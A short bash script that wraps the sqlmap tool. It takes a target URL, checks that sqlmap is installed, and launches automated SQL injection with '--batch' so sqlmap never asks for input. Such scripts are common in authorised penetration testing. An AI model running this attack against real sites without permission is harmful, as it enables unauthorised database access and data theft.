#!/bin/bash
# SQLMap - Automated SQL injection and database takeover tool
# Options:
# -u : URL to scan
# --batch : Never ask for user input, use the default behavior

# Usage: sqlmap_basic.sh <target_url>
# Example script
# sqlmap_basic.sh http://example.com/vuln.php?id=1

# Check if sqlmap is installed
if ! command -v sqlmap &> /dev/null
then
    echo "sqlmap could not be found, please install it first."
    exit
fi

# Ensure URL is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

TARGET_URL=$1

echo "Starting SQL injection on $TARGET_URL"

# Perform SQL injection
sqlmap -u $TARGET_URL --batch

echo "SQL injection completed."
